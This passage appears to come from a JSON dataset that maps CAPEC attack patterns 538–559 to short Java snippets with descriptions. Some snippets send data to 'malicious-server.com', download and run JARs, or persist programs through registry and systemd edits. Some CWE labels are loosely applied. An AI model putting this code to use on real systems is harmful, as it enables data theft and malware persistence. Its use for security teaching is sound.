        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class MaliciousFirmwareUpdater {\n    public static void main(String[] args) {\n        try {\n            // CWE-506: Embedded Malicious Code\n            File firmwareFile = new File(\"/path/to/firmware.bin\");\n            if (firmwareFile.exists()) {\n                // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n                String sensitiveInfo = \"Sensitive System Information\";\n                System.out.println(\"Exposing sensitive info: \" + sensitiveInfo);\n\n                // CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\n                FileWriter writer = new FileWriter(firmwareFile, true);\n                writer.write(\"\\n// Malicious code injected\\n\");\n                writer.write(\"System.out.println(\\\"Malicious code executed\\\");\");\n                writer.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents the infiltration of a hardware development environment by embedding malicious code into a firmware file. The code checks if a firmware file exists and then writes malicious code into it. This demonstrates CWE-506 (Embedded Malicious Code) by injecting harmful code into the firmware. It also prints sensitive system information, illustrating CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere). Additionally, the code assumes that the firmware file is not adequately protected, which aligns with CWE-1297 (Unprotected Confidential Information on Device is Accessible by OSAT Vendors). The overall idea is to show how an adversary can manipulate the development environment to compromise hardware components."
    },
    {
        "capec_id": "538",
        "capec_name": "Open-Source Library Manipulation",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableDownloader {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://example.com/malicious-library.jar\");\n            InputStream in = url.openStream();\n            FileOutputStream fos = new FileOutputStream(\"malicious-library.jar\");\n\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            fos.close();\n            in.close();\n\n            // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n            ProcessBuilder pb = new ProcessBuilder(\"java\", \"-jar\", \"malicious-library.jar\");\n            pb.start();\n\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable scenario where a program downloads a JAR file from a remote location and executes it without verifying its integrity or origin. This embodies the main idea of CAPEC-442 (Open-Source Library Manipulation) by showing how an adversary could implant malicious code in an open-source library, which is then downloaded and executed by the program. The code also highlights related CWEs: CWE-494 (Download of Code Without Integrity Check) and CWE-829 (Inclusion of Functionality from Untrusted Control Sphere). The downloaded JAR file could contain malicious code (CWE-506) that could further propagate (CWE-509) or exploit known vulnerabilities (CWE-1395)."
    },
    {
        "capec_id": "539",
        "capec_name": "ASIC With Malicious Functionality",
        "code_snippet": "public class MaliciousASIC {\n    private static final String SECRET_KEY = \"hardcoded_secret_key\";\n    private static final boolean DEBUG = true;\n\n    public static void main(String[] args) {\n        if (DEBUG) {\n            System.out.println(\"Debug mode is ON. Sensitive information might be exposed.\");\n        }\n        // Malicious functionality: Exposing sensitive system information\n        System.out.println(\"System Secret Key: \" + SECRET_KEY);\n    }\n\n    // Insecure Security Identifier Mechanism\n    public boolean isAuthorized(String securityIdentifier) {\n        // Improperly implemented security check\n        return securityIdentifier.equals(\"admin\");\n    }\n\n    // Improper Restriction of Security Token Assignment\n    public void assignSecurityToken(String user, String token) {\n        // Maliciously assigning a high-privilege token to any user\n        System.out.println(\"Assigning high-privilege token to user: \" + user);\n    }\n}",
        "description": "This Java code snippet represents a malicious ASIC scenario where an attacker has inserted harmful functionality into the system. The code includes several vulnerabilities: \n1. **Embedded Malicious Code (CWE-506)**: The code exposes a hardcoded secret key, which is a form of embedded malicious code. \n2. **Exposure of Sensitive System Information (CWE-497)**: The debug mode is enabled, which prints sensitive information to the console. \n3. **ASP.NET Misconfiguration (CWE-11)**: Debugging messages are enabled, which can help attackers learn about the system. \n4. **Insecure Security Identifier Mechanism (CWE-1294)**: The `isAuthorized` method has an insecure implementation that can be easily bypassed. \n5. **Improper Restriction of Security Token Assignment (CWE-1259)**: The `assignSecurityToken` method assigns high-privilege tokens without proper checks, allowing unauthorized access. This code snippet demonstrates how an attacker can introduce vulnerabilities into an ASIC to disrupt or compromise the system."
    },
    {
        "capec_id": "540",
        "capec_name": "Overread Buffers",
        "code_snippet": "public class BufferOverreadExample {\n    public static void main(String[] args) {\n        String[] data = {\"one\", \"two\", \"three\"};\n        int index = 4; // Intentionally out of bounds\n        try {\n            // Attempt to read beyond the buffer's boundary\n            System.out.println(data[index]);\n        } catch (ArrayIndexOutOfBoundsException e) {\n            System.out.println(\"Caught an exception: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a buffer over-read vulnerability. The 'data' array is defined with three elements, but the code attempts to access the element at index 4, which is out of bounds. This triggers an ArrayIndexOutOfBoundsException, which is caught and handled in the catch block. The code represents the main idea of the CAPEC 'Overread Buffers' by showing how an attempt to read beyond the boundary of a defined buffer can lead to an exception. This example is related to CWE-125 (Out-of-bounds Read) and CWE-126 (Buffer Over-read), as it involves reading data past the end of the intended buffer."
    },
    {
        "capec_id": "541",
        "capec_name": "Application Fingerprinting",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class FingerprintServer {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        while (true) {\n            Socket clientSocket = serverSocket.accept();\n            handleClient(clientSocket);\n        }\n    }\n\n    private static void handleClient(Socket clientSocket) throws IOException {\n        String clientMessage = readMessage(clientSocket);\n        String response;\n        if (clientMessage.contains(\"version\")) {\n            response = \"Application Version: 1.0.0\"; // Observable Response Discrepancy\n        } else if (clientMessage.contains(\"status\")) {\n            response = \"Application Status: Running\"; // Observable Behavioral Discrepancy\n        } else {\n            response = \"Unknown Command\";\n        }\n        clientSocket.getOutputStream().write(response.getBytes());\n        clientSocket.close();\n    }\n\n    private static String readMessage(Socket clientSocket) throws IOException {\n        byte[] buffer = new byte[1024];\n        int bytesRead = clientSocket.getInputStream().read(buffer);\n        return new String(buffer, 0, bytesRead);\n    }\n}",
        "description": "This Java code snippet represents a simple server that listens for incoming connections on port 8080. When a client connects, it reads a message and responds based on the content of the message. If the message contains 'version', it responds with the application version, and if it contains 'status', it responds with the application status. This demonstrates the concept of 'Application Fingerprinting' (CAPEC-170) by revealing internal state information through observable response discrepancies (CWE-204) and behavioral discrepancies (CWE-205). An attacker can use these responses to determine the type or version of the application installed on the server."
    },
    {
        "capec_id": "542",
        "capec_name": "Targeted Malware",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class TargetedMalware {\n    public static void main(String[] args) {\n        try {\n            // CWE-507: Trojan Horse - Appears benign but contains hidden malicious code\n            System.out.println(\"Starting benign operation...\");\n            benignOperation();\n\n            // CWE-506: Embedded Malicious Code - Malicious payload embedded in the code\n            String sensitiveData = getSensitiveSystemInfo();\n            sendSensitiveData(sensitiveData);\n\n            // CWE-509: Replicating Malicious Code - Replicates itself to other systems\n            replicateMalware();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void benignOperation() {\n        // Simulate benign operation\n        System.out.println(\"Performing benign operation...\");\n    }\n\n    private static String getSensitiveSystemInfo() throws IOException {\n        // CWE-497: Exposure of Sensitive System Information\n        // Simulate gathering sensitive system information\n        return \"Sensitive System Information\";\n    }\n\n    private static void sendSensitiveData(String data) throws IOException {\n        // CWE-512: Spyware - Sending collected data without user consent\n        URL url = new URL(\"http://malicious-server.com/collect\");\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(\"POST\");\n        conn.setDoOutput(true);\n        try (OutputStream os = conn.getOutputStream()) {\n            os.write(data.getBytes());\n            os.flush();\n        }\n        conn.getResponseCode();\n    }\n\n    private static void replicateMalware() throws IOException {\n        // Simulate replication of malware\n        System.out.println(\"Replicating malware to other systems...\");\n        // Code to replicate malware would go here\n    }\n}",
        "description": "This Java code snippet represents a targeted malware attack that leverages multiple weaknesses as described in the CAPEC and related CWEs. The main function starts with a benign operation to disguise the malicious intent (CWE-507: Trojan Horse). It then gathers sensitive system information (CWE-497: Exposure of Sensitive System Information) and sends this data to a remote server without user consent (CWE-512: Spyware). Finally, it simulates the replication of the malware to other systems (CWE-509: Replicating Malicious Code). The code embodies the main idea of the CAPEC by demonstrating how targeted malware can exploit known vulnerabilities to achieve various malicious objectives."
    },
    {
        "capec_id": "543",
        "capec_name": "Counterfeit Websites",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class CounterfeitWebsite {\n    public static void main(String[] args) {\n        try {\n            // CWE-601: URL Redirection to Untrusted Site\n            String maliciousUrl = \"http://malicious.example.com\";\n            redirectUser(maliciousUrl);\n\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://malicious.example.com/malware.jar\");\n            InputStream in = url.openStream();\n            Files.copy(in, Paths.get(\"malware.jar\"), StandardCopyOption.REPLACE_EXISTING);\n            in.close();\n            Runtime.getRuntime().exec(\"java -jar malware.jar\");\n\n            // CWE-352: Cross-Site Request Forgery (CSRF)\n            String csrfToken = \"fakeToken\";\n            sendRequestWithCsrf(csrfToken);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void redirectUser(String url) throws IOException {\n        // Simulate URL redirection\n        System.out.println(\"Redirecting to: \" + url);\n    }\n\n    private static void sendRequestWithCsrf(String token) throws IOException {\n        // Simulate CSRF attack\n        URL url = new URL(\"http://legitimate.example.com/action?token=\" + token);\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(\"GET\");\n        conn.getResponseCode();\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of a counterfeit website by incorporating several related CWEs. The main idea is to show how an adversary might create a counterfeit website to perform malicious activities. The code includes:\n\n1. CWE-601: URL Redirection to Untrusted Site - The `redirectUser` method simulates redirecting a user to a malicious URL.\n2. CWE-494: Download of Code Without Integrity Check - The code downloads a malicious JAR file from a remote location and executes it without verifying its integrity.\n3. CWE-352: Cross-Site Request Forgery (CSRF) - The `sendRequestWithCsrf` method simulates sending a request with a fake CSRF token to perform unauthorized actions on behalf of the user.\n\nThis snippet represents how counterfeit websites can be used to gather information, upload malware, and perform unauthorized actions, embodying the main idea of the CAPEC."
    },
    {
        "capec_id": "544",
        "capec_name": "Counterfeit Organizations",
        "code_snippet": "import javax.net.ssl.HttpsURLConnection;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.URL;\nimport java.security.cert.Certificate;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"https://fake-supplier.com/resource\");\n            HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();\n            connection.setSSLSocketFactory((SSLSocketFactory) SSLSocketFactory.getDefault());\n            connection.connect();\n\n            // CWE-295: Improper Certificate Validation\n            Certificate[] certs = connection.getServerCertificates();\n            for (Certificate cert : certs) {\n                System.out.println(\"Certificate: \" + cert.toString());\n            }\n\n            // CWE-941: Incorrectly Specified Destination in a Communication Channel\n            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            String inputLine;\n            while ((inputLine = in.readLine()) != null) {\n                System.out.println(inputLine);\n            }\n            in.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an application connects to a counterfeit supplier's website ('https://fake-supplier.com/resource') and retrieves data without properly validating the SSL certificate (CWE-295). The code also exemplifies CWE-941 by potentially misdirecting communication to an incorrect destination. The main idea of the CAPEC is represented by the creation of a false front organization (fake-supplier.com) that injects malicious components into the supply chain. The improper certificate validation allows the adversary to exploit the connection, while the incorrect destination specification could lead to data being sent to or received from an unintended actor."
    },
    {
        "capec_id": "545",
        "capec_name": "Pull Data from System Resources",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\n\npublic class SensitiveDataExposure {\n    public static void main(String[] args) {\n        // Example of pulling data from system resources\n        File sensitiveFile = new File(\"/path/to/sensitive/data.txt\");\n        try (FileInputStream fis = new FileInputStream(sensitiveFile)) {\n            byte[] data = new byte[(int) sensitiveFile.length()];\n            fis.read(data);\n            // Simulate processing of sensitive data\n            System.out.println(\"Sensitive data: \" + new String(data));\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        // Example of improper zeroization of sensitive data\n        byte[] sensitiveData = new byte[1024];\n        // Sensitive data processing\n        // ...\n        // Improper zeroization\n        sensitiveData = null; // Data is not properly cleared\n\n        // Example of sensitive information uncleared before state transition\n        enterDebugMode();\n    }\n\n    private static void enterDebugMode() {\n        // Simulate entering debug mode without clearing sensitive information\n        System.out.println(\"Entering debug mode with sensitive data uncleared.\");\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Pull Data from System Resources' by reading sensitive data from a file and processing it. It also highlights several related CWEs: \n1. Improper zeroization of sensitive data (CWE-1239) by setting the sensitive data array to null without properly clearing its contents.\n2. Sensitive information uncleared before state transition (CWE-1272) by entering debug mode without clearing sensitive data.\nThe code represents the main idea of the CAPEC by showing how an adversary can pull data from system resources and how improper handling of sensitive data can lead to exposure."
    },
    {
        "capec_id": "546",
        "capec_name": "Incomplete Data Deletion in a Multi-Tenant Environment",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class IncompleteDataDeletion {\n    public static void main(String[] args) {\n        String tenantData = \"Sensitive Information\";\n        File file = new File(\"tenantData.txt\");\n\n        // Simulate writing sensitive data to a file\n        try (FileWriter writer = new FileWriter(file)) {\n            writer.write(tenantData);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        // Simulate incomplete data deletion\n        if (file.delete()) {\n            System.out.println(\"File deleted, but data may still be recoverable.\");\n        } else {\n            System.out.println(\"Failed to delete the file.\");\n        }\n\n        // Simulate allocation of the same resource to a new tenant\n        try (FileWriter writer = new FileWriter(file)) {\n            writer.write(\"New Tenant Data\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        // Potentially malicious tenant reads the file\n        try (Scanner scanner = new Scanner(file)) {\n            while (scanner.hasNextLine()) {\n                System.out.println(\"Read from file: \" + scanner.nextLine());\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of incomplete data deletion in a multi-tenant environment. The code simulates a scenario where sensitive information is written to a file by one tenant. The file is then deleted, but the deletion is incomplete, meaning the data may still be recoverable. The same file resource is then allocated to a new tenant, who writes new data to it. Finally, the new tenant reads the file, potentially recovering the sensitive information left by the previous tenant. This example highlights the risks associated with improper data deletion and the potential for unauthorized access to sensitive information in a multi-tenant environment."
    },
    {
        "capec_id": "547",
        "capec_name": "Physical Destruction of Device or Component",
        "code_snippet": "public class Device {\n    private boolean isDestroyed = false;\n\n    public void destroy() {\n        // CWE-1082: Class Instance Self Destruction Control Element\n        isDestroyed = true;\n        System.out.println(\"Device is destroyed.\");\n    }\n\n    public void processData() {\n        if (isDestroyed) {\n            // CWE-1301: Insufficient or Incomplete Data Removal within Hardware Component\n            System.out.println(\"Error: Device is destroyed. Data processing halted.\");\n            return;\n        }\n        // Simulate data processing\n        System.out.println(\"Processing data...\");\n    }\n\n    public void injectError() {\n        // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n        System.out.println(\"Error injected. Device redundancy compromised.\");\n    }\n\n    public static void main(String[] args) {\n        Device device = new Device();\n        device.processData();\n        device.injectError();\n        device.destroy();\n        device.processData();\n    }\n}",
        "description": "This Java code snippet represents a simplified model of a device that can be physically destroyed, embodying the main idea of CAPEC-Physical Destruction of Device or Component. The 'Device' class includes methods to destroy the device (CWE-1082), process data (with a check for destruction status, CWE-1301), and inject errors (CWE-1334). The 'destroy' method sets a flag indicating the device is destroyed, and subsequent data processing is halted if the device is destroyed. The 'injectError' method simulates the injection of errors that could compromise the device's redundancy. This code demonstrates how physical destruction and error injection can affect the functionality and reliability of a device."
    },
    {
        "capec_id": "548",
        "capec_name": "Contaminate Resource",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class ContaminateResourceExample {\n    public static void main(String[] args) {\n        try {\n            // CWE-319: Cleartext Transmission of Sensitive Information\n            String sensitiveData = \"Sensitive Information\";\n            Socket socket = new Socket(\"example.com\", 80);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            out.println(sensitiveData); // Transmitting sensitive data in cleartext\n\n            // CWE-212: Improper Removal of Sensitive Information Before Storage or Transfer\n            File file = new File(\"sensitiveData.txt\");\n            FileWriter writer = new FileWriter(file);\n            writer.write(sensitiveData); // Storing sensitive data without proper removal\n            writer.close();\n\n            // CWE-226: Sensitive Information in Resource Not Removed Before Reuse\n            RandomAccessFile raf = new RandomAccessFile(file, \"rw\");\n            raf.setLength(0); // Not properly zeroizing the file before reuse\n            raf.close();\n\n            // CWE-922: Insecure Storage of Sensitive Information\n            File insecureFile = new File(\"insecureData.txt\");\n            FileOutputStream fos = new FileOutputStream(insecureFile);\n            fos.write(sensitiveData.getBytes()); // Insecurely storing sensitive data\n            fos.close();\n\n            // CWE-402: Transmission of Private Resources into a New Sphere ('Resource Leak')\n            InputStream is = new FileInputStream(insecureFile);\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = is.read(buffer)) != -1) {\n                // Leaking sensitive data to an untrusted party\n                System.out.write(buffer, 0, bytesRead);\n            }\n            is.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates several vulnerabilities related to the 'Contaminate Resource' CAPEC. The code transmits sensitive information in cleartext (CWE-319), stores sensitive data without proper removal (CWE-212), fails to zeroize sensitive information before reuse (CWE-226), insecurely stores sensitive information (CWE-922), and leaks sensitive data to an untrusted party (CWE-402). These actions can lead to contamination of organizational information systems, requiring them to be taken offline for investigation and mitigation, thus denying availability."
    },
    {
        "capec_id": "549",
        "capec_name": "Local Execution of Code",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://example.com/malicious.jar\");\n            InputStream in = url.openStream();\n            FileOutputStream fos = new FileOutputStream(\"malicious.jar\");\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            fos.close();\n            in.close();\n\n            // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n            ProcessBuilder pb = new ProcessBuilder(\"java\", \"-jar\", \"malicious.jar\");\n            pb.start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where malicious code is downloaded and executed on a local system, embodying the main idea of CAPEC-Local Execution of Code. The code first downloads a JAR file from a remote URL without performing any integrity checks (CWE-494). It then executes the downloaded JAR file, which could contain malicious functionality, thus including functionality from an untrusted control sphere (CWE-829). This example highlights the risks associated with downloading and executing code from untrusted sources without proper validation."
    },
    {
        "capec_id": "550",
        "capec_name": "Install New Service",
        "code_snippet": "import java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class InstallService {\n    public static void main(String[] args) {\n        try {\n            // CWE-284: Improper Access Control\n            String serviceName = \"MyService\";\n            String serviceCommand = \"C:\\\\path\\\\to\\\\malicious.exe\";\n            String serviceRegistryPath = \"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\\" + serviceName;\n\n            // CWE-1188: Initialization of a Resource with an Insecure Default\n            String registryScript = \"Windows Registry Editor Version 5.00\\n\" +\n                    \"[\" + serviceRegistryPath + \"]\\n\" +\n                    \"\\\"ImagePath\\\"=\\\"\" + serviceCommand + \"\\\"\\n\" +\n                    \"\\\"Start\\\"=dword:00000002\\n\"; // Auto-start service\n\n            // Write the registry script to a file\n            Files.write(Paths.get(\"install_service.reg\"), registryScript.getBytes());\n\n            // Execute the registry script to install the service\n            Runtime.getRuntime().exec(\"regedit /s install_service.reg\");\n\n            System.out.println(\"Service installed successfully.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the installation of a new service on a Windows system by modifying the registry, which is a common technique used by adversaries to ensure their malicious software runs at startup. The code creates a registry script that sets up a new service with a specified name and command. The service is configured to start automatically (CWE-1188: Initialization of a Resource with an Insecure Default). The script is then executed using the `regedit` command to apply the changes to the registry. This example also highlights CWE-284 (Improper Access Control) as it does not enforce any access control checks, allowing unauthorized modification of the registry."
    },
    {
        "capec_id": "551",
        "capec_name": "Modify Existing Service",
        "code_snippet": "import java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardOpenOption;\n\npublic class ModifyService {\n    public static void main(String[] args) {\n        String serviceConfigPath = \"/etc/systemd/system/my-service.service\";\n        String maliciousConfig = \"[Service]\\nExecStart=/bin/malicious-script.sh\\n\";\n\n        try {\n            // CWE-284: Improper Access Control\n            Files.write(Paths.get(serviceConfigPath), maliciousConfig.getBytes(), StandardOpenOption.APPEND);\n            System.out.println(\"Service configuration modified.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Modify Existing Service' by altering the configuration of a system service. The code appends a malicious configuration to an existing service file, potentially enabling a disabled service or modifying its behavior. This embodies CWE-284 (Improper Access Control) as it assumes the code has the necessary permissions to modify the service configuration file. The code does not handle credentials securely (CWE-522) and does not ensure the integrity of the service configuration (CWE-15). The snippet is a simplified example to illustrate how modifying a service configuration can introduce vulnerabilities."
    },
    {
        "capec_id": "552",
        "capec_name": "Install Rootkit ",
        "code_snippet": "import java.io.*;\nimport java.nio.file.*;\n\npublic class RootkitInstaller {\n    public static void main(String[] args) {\n        if (args.length != 2) {\n            System.out.println(\"Usage: java RootkitInstaller <targetFile> <maliciousCode>\");\n            return;\n        }\n\n        String targetFile = args[0];\n        String maliciousCode = args[1];\n\n        try {\n            // CWE-284: Improper Access Control\n            Files.setPosixFilePermissions(Paths.get(targetFile), PosixFilePermissions.fromString(\"rwxrwxrwx\"));\n\n            // CWE-78: OS Command Injection\n            String command = \"echo \" + maliciousCode + \" >> \" + targetFile;\n            Runtime.getRuntime().exec(command);\n\n            // CWE-506: Embedded Malicious Code\n            // CWE-507: Trojan Horse\n            // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n            System.out.println(\"Malicious code injected into \" + targetFile);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified example of how an attacker might install a rootkit by exploiting various weaknesses. The code takes two arguments: a target file and a string of malicious code. It first sets the file permissions to be fully accessible (CWE-284: Improper Access Control). Then, it constructs and executes an OS command to append the malicious code to the target file (CWE-78: OS Command Injection). The injected code represents embedded malicious code (CWE-506) and a Trojan horse (CWE-507), as it hides harmful functionality within seemingly benign operations. Finally, it prints a message indicating the injection, which could expose sensitive system information to unauthorized actors (CWE-497). This snippet encapsulates the essence of installing a rootkit by manipulating system files and permissions to hide malicious activities."
    },
    {
        "capec_id": "554",
        "capec_name": "Functionality Bypass",
        "code_snippet": "import java.util.Scanner;\n\npublic class AuthenticationBypass {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter username: \");\n        String username = scanner.nextLine();\n        System.out.print(\"Enter password: \");\n        String password = scanner.nextLine();\n\n        // Client-side enforcement of server-side security\n        if (username.equals(\"admin\") && password.equals(\"password123\")) {\n            System.out.println(\"Access granted.\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n\n        // Bypass protection mechanism\n        System.out.print(\"Enter admin command: \");\n        String command = scanner.nextLine();\n        if (command.equals(\"bypass\")) {\n            System.out.println(\"Admin access granted without authentication.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a functionality bypass vulnerability. The code initially checks for a username and password to grant access, which is a form of client-side enforcement of server-side security (CWE-602). However, it also includes a bypass mechanism where entering a specific command ('bypass') grants admin access without proper authentication, representing a protection mechanism failure (CWE-693). This bypass allows an attacker to circumvent the intended security checks, embodying the main idea of the CAPEC 'Functionality Bypass'."
    },
    {
        "capec_id": "555",
        "capec_name": "Remote Services with Stolen Credentials",
        "code_snippet": "import java.io.*;\nimport java.net.*;\nimport java.util.Base64;\n\npublic class VulnerableRemoteService {\n    public static void main(String[] args) {\n        try {\n            Socket socket = new Socket(\"example.com\", 22); // CWE-308: Single-factor authentication\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n            String username = \"admin\";\n            String password = \"password123\"; // CWE-521: Weak password requirements\n            String credentials = username + \":\" + password;\n            String encodedCredentials = Base64.getEncoder().encodeToString(credentials.getBytes()); // CWE-522: Insufficiently protected credentials\n\n            out.println(\"AUTH \" + encodedCredentials);\n            String response = in.readLine();\n\n            if (\"OK\".equals(response)) {\n                System.out.println(\"Authenticated successfully\");\n                // Perform sensitive operations\n            } else {\n                System.out.println(\"Authentication failed\");\n            }\n\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable remote service authentication mechanism. The code connects to a remote service using a socket (potentially SSH on port 22) and performs single-factor authentication (CWE-308) using a username and a weak password (CWE-521). The credentials are encoded using Base64 (CWE-522), which is an insufficient method for protecting credentials. This setup is susceptible to various attacks, including credential theft and replay attacks, embodying the main idea of the CAPEC 'Remote Services with Stolen Credentials'."
    },
    {
        "capec_id": "556",
        "capec_name": "Replace File Extension Handlers",
        "code_snippet": "import java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.nio.file.attribute.FileAttribute;\n\npublic class FileHandlerModifier {\n    public static void main(String[] args) {\n        if (args.length != 2) {\n            System.out.println(\"Usage: java FileHandlerModifier <file-extension> <program-path>\");\n            return;\n        }\n\n        String fileExtension = args[0];\n        String programPath = args[1];\n\n        try {\n            // CWE-284: Improper Access Control\n            // CWE-73: External Control of File Name or Path\n            Path handlerFile = Paths.get(\"C:\\\\Windows\\\\System32\\\\handlers\\\\\" + fileExtension + \".handler\");\n            Files.write(handlerFile, programPath.getBytes(), new FileAttribute<?>[0]);\n            System.out.println(\"File handler for \" + fileExtension + \" set to \" + programPath);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates how an application can modify the file handler for a given file extension to call an arbitrary program when a file with that extension is opened. The code takes two command-line arguments: the file extension and the path to the program that should handle files with that extension. It then writes this information to a handler file in the system directory. This embodies the CAPEC 'Replace File Extension Handlers' by showing how an attacker could potentially change file handlers to execute arbitrary programs. The code also touches on related CWEs: CWE-284 (Improper Access Control) by not restricting access to the handler file, and CWE-73 (External Control of File Name or Path) by allowing user input to control the file path."
    },
    {
        "capec_id": "557",
        "capec_name": "DEPRECATED: Schedule Software To Run",
        "code_snippet": "import java.util.Timer;\nimport java.util.TimerTask;\n\npublic class DeprecatedScheduler {\n    public static void main(String[] args) {\n        Timer timer = new Timer();\n        TimerTask task = new TimerTask() {\n            @Override\n            public void run() {\n                System.out.println(\"Task executed\");\n            }\n        };\n        // Schedule the task to run after 1 second\n        timer.schedule(task, 1000);\n    }\n}",
        "description": "This Java code snippet demonstrates the use of the `Timer` and `TimerTask` classes to schedule a task to run after a delay. The `Timer` class is considered obsolete and has been largely replaced by the `ScheduledExecutorService` in modern Java applications. This code embodies the main idea of the deprecated CAPEC 'Schedule Software To Run' by showing how a task can be scheduled to run at a later time. Additionally, it touches on CWE-477 'Use of Obsolete Function' by using the outdated `Timer` class, which suggests that the code has not been actively reviewed or maintained. The code also indirectly relates to CWE-1101 'Reliance on Runtime Component in Generated Code' as it relies on the `Timer` class, which is part of the Java runtime library."
    },
    {
        "capec_id": "558",
        "capec_name": "Replace Trusted Executable",
        "code_snippet": "import java.nio.file.*;\nimport java.io.IOException;\n\npublic class ReplaceTrustedExecutable {\n    public static void main(String[] args) {\n        String trustedExecutablePath = \"/usr/bin/trustedExecutable\";\n        String maliciousExecutablePath = \"/tmp/maliciousExecutable\";\n\n        try {\n            // CWE-284: Improper Access Control - No proper access control checks\n            Files.copy(Paths.get(maliciousExecutablePath), Paths.get(trustedExecutablePath), StandardCopyOption.REPLACE_EXISTING);\n            System.out.println(\"Trusted executable replaced successfully.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an attacker replaces a trusted executable with a malicious one. The code lacks proper access control checks (CWE-284), allowing the replacement of the trusted executable located at '/usr/bin/trustedExecutable' with a malicious executable from '/tmp/maliciousExecutable'. This embodies the main idea of the CAPEC 'Replace Trusted Executable', where an adversary exploits weaknesses in privilege management or access control to replace a trusted executable with a malicious version. The code also indirectly touches on CWE-114 (Process Control) by allowing the execution of potentially malicious commands from an untrusted source."
    },
    {
        "capec_id": "559",
        "capec_name": "Orbital Jamming",
